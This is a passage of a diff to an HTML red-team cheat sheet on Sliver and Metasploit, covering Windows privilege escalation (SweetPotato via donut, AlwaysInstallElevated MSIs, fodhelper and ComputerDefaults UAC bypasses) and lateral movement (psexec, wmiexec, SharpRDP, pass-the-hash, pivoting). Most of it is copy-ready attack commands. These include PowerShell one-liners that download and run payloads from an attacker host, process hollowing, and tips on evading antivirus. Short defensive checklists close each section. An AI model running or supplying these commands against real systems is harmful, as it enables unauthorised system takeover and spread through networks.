+      <p>Any process holding <code>SeImpersonatePrivilege</code> (e.g., IIS worker, MSSQL service) can be leveraged via *Potato variants. SweetPotato with EfsRpc is reliable on modern Windows Server. Encode the payload with donut → inject via <code>execute-shellcode</code>.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Convert SweetPotato.exe to position-independent shellcode via donut</span>
+donut -i <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.exe -a 2 -b 2 \
+  -p <span class="s">"-p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((New-Object Net.WebClient).DownloadString('http://<span class="v">&lt;LHOST&gt;</span>/payload.ps1'))\""</span> \
+  -o <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.bin
+
+<span class="c"># EfsRpc variant (more reliable when default fails)</span>
+donut -i <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.exe -a 2 -b 2 \
+  -p <span class="s">"-e EfsRpc -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((New-Object Net.WebClient).DownloadString('http://<span class="v">&lt;LHOST&gt;</span>/payload.ps1'))\""</span> \
+  -o <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.bin</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Sacrificial process + inject SweetPotato shellcode (recommended)</span>
+execute notepad
+ps -e notepad
+execute-shellcode -S -r -I 30 -p <span class="v">&lt;PID&gt;</span> <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.bin
+
+<span class="c"># In-process variant (faster but less stable)</span>
+execute-shellcode -i -S -r -I 30 <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.bin
+
+<span class="c"># Direct assembly execution</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SweetPotato.exe \
+  -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \
+  -a <span class="s">"-ep bypass -nop iex (New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/payload.ps1')"</span>
+
+<span class="c"># Immediately hollow the shell into svchost (AV kills SweetPotato host quickly)</span>
+hollow svchost.exe <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.bin</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># MSF equivalent — juicy potato (older Windows) or getsystem (varies)</span>
+<span class="k">msf6</span> &gt; use exploit/windows/local/ms16_075_reflection_juicy
+<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
+<span class="k">msf6</span> &gt; run
+
+meterpreter &gt; getsystem   <span class="c"># tries token duplication / named pipe / rotten potato</span></code></pre></div>
+
+      <h3>AlwaysInstallElevated</h3>
+      <p>When both <code>HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code> and its HKCU counterpart are set to 1, any MSI runs as SYSTEM. Build an MSI wrapping the implant EXE with <code>wixl</code> from the MSI-AlwaysInstallElevated template, then <code>msiexec /qn /i http://...</code>.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>sudo apt install wixl
+cd ~/tools
+git clone https://github.com/KINGSABRI/MSI-AlwaysInstallElevated
+cd MSI-AlwaysInstallElevated
+
+<span class="c"># Drop the Sliver .exe implant into cwd</span>
+cp <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.exe .
+
+<span class="c"># Edit WXS-Templates/alwaysInstallElevated-3.wxs line 15:</span>
+<span class="c"># Change  Source="setup.exe"  →  Source="payload.x64.exe"</span>
+
+wixl -v WXS-Templates/alwaysInstallElevated-3.wxs -o alwaysInstallElevated.msi
+sudo cp alwaysInstallElevated.msi /var/www/html
+sudo chmod 644 /var/www/html/alwaysInstallElevated.msi</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>execute -t 40 -o msiexec /qn /i http://<span class="v">&lt;LHOST&gt;</span>/alwaysInstallElevated.msi</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="k">msf6</span> &gt; use exploit/windows/local/always_install_elevated
+<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
+<span class="k">msf6</span> &gt; run</code></pre></div>
+
+      <h3>UAC Bypass — Fodhelper / ComputerDefaults</h3>
+      <p>Auto-elevate binaries (<code>fodhelper.exe</code>, <code>ComputerDefaults.exe</code>) load handlers from HKCU without UAC prompt. Plant a registry key pointing to your payload, then launch the binary. Ideal to disable Defender first; the bypass itself is user-level.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># ComputerDefaults variant</span>
+sharpsh -- -c <span class="s">'New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force'</span>
+sharpsh -- -c <span class="s">'New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force'</span>
+execute -o powershell <span class="s">'Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c powershell -w hidden -c &lt;stager&gt;" -Force'</span>
+execute -o powershell <span class="s">'Start-Process "C:\Windows\System32\ComputerDefaults.exe"'</span>
+
+<span class="c"># Verify elevation</span>
+execute -o whoami /priv
+sa-whoami
+getsystem</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Fodhelper variant (equivalent registry, different auto-elevate binary)</span>
+sharpsh -- -c <span class="s">'New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (iwr http://&lt;LHOST&gt;/payload.ps1 -usebasicparsing) | IEX" -Force'</span>
+sharpsh -- -c <span class="s">'New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force'</span>
+execute -o powershell <span class="s">'Start-Process "C:\Windows\System32\fodhelper.exe"'</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="k">msf6</span> &gt; use exploit/windows/local/bypassuac_fodhelper
+<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
+<span class="k">msf6</span> &gt; set PAYLOAD windows/x64/meterpreter/reverse_https
+<span class="k">msf6</span> &gt; set LHOST <span class="v">&lt;LHOST&gt;</span>
+<span class="k">msf6</span> &gt; run
+
+<span class="c"># Alternates</span>
+<span class="k">msf6</span> &gt; use exploit/windows/local/bypassuac_comhijack
+<span class="k">msf6</span> &gt; use exploit/windows/local/bypassuac_eventvwr
+<span class="k">msf6</span> &gt; use exploit/windows/local/bypassuac_sdclt</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Service ACL audit: <code>Get-Acl</code> on all services, alerting on non-admin write permissions.</li>
+          <li><code>SeImpersonatePrivilege</code> only granted to expected accounts (LOCAL SERVICE, NETWORK SERVICE, IIS AppPool, MSSQL); anything else on a workstation is suspicious.</li>
+          <li>Disable AlwaysInstallElevated in Group Policy (default is disabled — its presence in HKLM is the misconfig).</li>
+          <li>UAC bypass detection: monitor HKCU registry writes to <code>ms-settings\shell\open\command</code> and unusual launches of fodhelper / ComputerDefaults from user context.</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s06" class="reveal">
+      <h2><span class="num">06</span>Lateral Movement<span class="jp">横展開</span></h2>
+      <p>After privesc and credential access (see <a href="ad-compromise.html">ad-compromise</a>), pivot to adjacent hosts. Sliver's <code>jump-*</code> family provides one-liner beacon delivery; <code>psexec</code> is legacy but reliable; BOFs (<code>sa-whoami</code>) enumerate quietly on remote hosts. Metasploit uses <code>exploit/windows/smb/psexec</code> and its variants.</p>
+
+      <h3>Sliver — BOF enumeration on remote context</h3>
+      <p>BOFs execute inline in the implant process — no new process, no <code>whoami.exe</code> spawning, much quieter for EDR.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>sa-whoami
+
+[*] Successfully executed sa-whoami
+[*] Got output:
+
+UserName        SID
+====================== ====================================
+...
+
+GROUP INFORMATION                                 Type                     SID
+================================================= ===================== ============================================================
+Everyone                                          Well-known group         S-1-1-0
+...</code></pre></div>
+
+      <h3>Sliver — psexec (classic service-based)</h3>
+      <p>Requires a <em>service-format</em> profile and a corresponding HTTP listener on the operator. Sliver drops a service binary, registers it, and starts it — the beacon calls back through the listener.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>psexec -d <span class="v">&lt;SVC_TITLE&gt;</span> -s <span class="v">&lt;SVC_DESC&gt;</span> -p svc-lateral <span class="v">&lt;TARGET&gt;</span>
+psexec -d <span class="v">&lt;SVC_TITLE&gt;</span> -s <span class="v">&lt;SVC_DESC&gt;</span> -p svc-lateral <span class="v">&lt;DC&gt;</span>
+
+<span class="c"># Attach to the new session</span>
+use <span class="v">&lt;session_id&gt;</span></code></pre></div>
+
+      <h3>Sliver — jump-psexec (one-liner drop &amp; run)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>jump-psexec <span class="v">&lt;TARGET&gt;</span> <span class="v">&lt;SVC_NAME&gt;</span> <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.exe //<span class="v">&lt;TARGET&gt;</span>/c$/second.exe</code></pre></div>
+
+      <h3>Sliver — jump-wmiexec</h3>
+      <p>WMI-based execution avoids service creation (no <code>services.exe</code> child, no <em>7045</em> event log). The command runs under <code>wmiprvse.exe</code>.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>jump-wmiexec <span class="v">&lt;TARGET&gt;</span> <span class="s">'powershell -w hidden -enc &lt;BASE64_PAYLOAD&gt;'</span></code></pre></div>
+
+      <h3>Sliver — SharpRDP (RDP-based execution)</h3>
+      <p>Executes commands via RDP's virtual channel without a full desktop session. Useful when SMB/WMI are blocked but RDP is allowed. Sometimes hangs post-auth on modern RDP; test in isolation before relying on it.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Upload SharpRDP and invoke</span>
+upload <span class="v">&lt;TOOL_DIR&gt;</span>/SharpRDP.exe c:/windows/temp/sharprdp.exe
+cd c:/windows/temp/
+
+c:/windows/temp/sharprdp.exe computername=<span class="v">&lt;TARGET&gt;</span> command=calc \
+  username=<span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;USER&gt;</span> password=<span class="s">"&lt;PASSWORD&gt;"</span>
+
+c:/windows/temp/sharprdp.exe computername=<span class="v">&lt;TARGET&gt;</span> \
+  command=<span class="s">"powershell -w hidden -enc &lt;BASE64_PAYLOAD&gt;"</span> \
+  username=<span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;USER&gt;</span> password=<span class="s">"&lt;PASSWORD&gt;"</span>
+
+<span class="c"># Direct assembly execution via Sliver</span>
+sharprdp -- computername=<span class="v">&lt;TARGET&gt;</span> password=<span class="v">&lt;PASSWORD&gt;</span> username=Administrator \
+  command=C:\\Windows\\Temp\\second.beacon.exe</code></pre></div>
+
+      <h3>Metasploit — psexec &amp; variants</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># Classic psexec with NTLM auth</span>
+<span class="k">msf6</span> &gt; use exploit/windows/smb/psexec
+<span class="k">msf6</span> &gt; set RHOSTS <span class="v">&lt;TARGET&gt;</span>
+<span class="k">msf6</span> &gt; set SMBUser <span class="v">&lt;USER&gt;</span>
+<span class="k">msf6</span> &gt; set SMBDomain <span class="v">&lt;DOMAIN&gt;</span>
+<span class="k">msf6</span> &gt; set SMBPass <span class="v">&lt;PASSWORD&gt;</span>
+<span class="c"># Pass-the-Hash</span>
+<span class="k">msf6</span> &gt; set SMBPass <span class="v">&lt;LM_HASH:NT_HASH&gt;</span>
+<span class="k">msf6</span> &gt; set PAYLOAD windows/x64/meterpreter/reverse_https
+<span class="k">msf6</span> &gt; set LHOST <span class="v">&lt;LHOST&gt;</span>
+<span class="k">msf6</span> &gt; exploit
+
+<span class="c"># PowerShell variant — no binary on disk, avoids some AV</span>
+<span class="k">msf6</span> &gt; use exploit/windows/smb/psexec_psh
+<span class="k">msf6</span> &gt; set RHOSTS <span class="v">&lt;TARGET&gt;</span>
+<span class="k">msf6</span> &gt; exploit
+
+<span class="c"># Command exec (no session, just command output)</span>
+<span class="k">msf6</span> &gt; use auxiliary/admin/smb/psexec_command</code></pre></div>
+
+      <h3>Metasploit — routing &amp; pivot</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># Autoroute through existing session (pivots subsequent modules through target)</span>
+<span class="k">msf6</span> &gt; use post/multi/manage/autoroute
+<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
+<span class="k">msf6</span> &gt; set SUBNET <span class="v">&lt;TARGET_SUBNET/24&gt;</span>
+<span class="k">msf6</span> &gt; run
+
+<span class="c"># SOCKS proxy to route external tools</span>
+<span class="k">msf6</span> &gt; use auxiliary/server/socks_proxy
+<span class="k">msf6</span> &gt; set VERSION 5
+<span class="k">msf6</span> &gt; run -j</code></pre></div>
+
+      <div class="note"><span class="lbl">note</span>Sliver <code>jump-*</code> commands do not natively accept NTLM hashes — the current implant must already hold a session token to the target. Use <code>make-token</code> or <code>Rubeus createnetonly</code> to establish the auth context first. MSF's psexec accepts hashes directly.</div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Sysmon Event ID 1 (process creation) with <code>ParentImage=services.exe</code> and unusual child — catches psexec service drops.</li>
+          <li>Event ID 4624 (logon) type 3 (network) from workstations to workstations without justification — anomalous laterally.</li>
+          <li>Event ID 5140 (share access) for admin$ / c$ from non-admin sources.</li>
+          <li>WMI logging (<code>Microsoft-Windows-WMI-Activity/Operational</code>) — <code>jump-wmiexec</code> and equivalents leave traces.</li>
+          <li>Restrict RDP (network-level auth, jump servers, monitor SharpRDP-signature virtual channel patterns).</li>
         </ul>
       </div>
     </section>
 
     <section id="ref" class="reveal">
-      <h2><span class="num">06</span>参照<span class="jp">References</span></h2>
+      <h2><span class="num">07</span>References<span class="jp">参照</span></h2>
       <ul>
-        <li>Sliver — <a href="https://sliver.sh/docs" target="_blank" rel="noopener">sliver.sh/docs</a></li>
-        <li>Metasploit — <a href="https://docs.metasploit.com" target="_blank" rel="noopener">docs.metasploit.com</a></li>
-        <li>donut — <a href="https://github.com/TheWover/donut" target="_blank" rel="noopener">github.com/TheWover/donut</a></li>
-        <li>MITRE ATT&amp;CK — Command and Control (TA0011) — <a href="https://attack.mitre.org/tactics/TA0011/" target="_blank" rel="noopener">attack.mitre.org</a></li>
+        <li>Sliver — <a href="https://github.com/BishopFox/sliver" target="_blank" rel="noopener">BishopFox/sliver</a></li>
+        <li>Sliver Armory — <a href="https://github.com/sliverarmory" target="_blank" rel="noopener">sliverarmory</a></li>
+        <li>Metasploit Framework — <a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">rapid7/metasploit-framework</a></li>
+        <li>donut (position-independent shellcode from PE) — <a href="https://github.com/TheWover/donut" target="_blank" rel="noopener">TheWover/donut</a></li>
+        <li>SweetPotato — <a href="https://github.com/CCob/SweetPotato" target="_blank" rel="noopener">CCob/SweetPotato</a></li>
+        <li>SharpUp / SharpRDP / SharpSh / Stracciatella — GhostPack / SpecterOps toolchain</li>
+        <li>MITRE ATT&amp;CK — <a href="https://attack.mitre.org/tactics/TA0011/" target="_blank" rel="noopener">TA0011 Command and Control</a></li>
       </ul>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>Sliver excels at evasion (BOFs, execute-assembly, hollow); Metasploit excels at rapid staging and vast module library.</li>
+          <li>Same shellcode from <code>msfvenom</code> can feed either framework — XOR encoding gains AV-signature evasion regardless of downstream C2.</li>
+          <li>Always migrate/hollow before running noisy tools; never mix operator and target credentials in the same process.</li>
+          <li>Sliver's <code>jump-*</code> lateral commands need pre-established token context; MSF's psexec accepts hashes for pure Pass-the-Hash flow.</li>
+        </ul>
+      </div>
     </section>
+
   </article>
-</div></div>
+</div>
+</div>
 </main>
 
-<footer class="foot"><div class="wrap">
-  <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Command &amp; Control</span></div>
-  <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>github</a></div>
-  <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
-</div></footer>
+<footer class="foot">
+  <div class="wrap">
+    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Command &amp; Control</span></div>
+    <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
+    <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+  </div>
+</footer>
 
 <script src="../content.js"></script>
 <script src="../assets/js/sheet.js"></script>
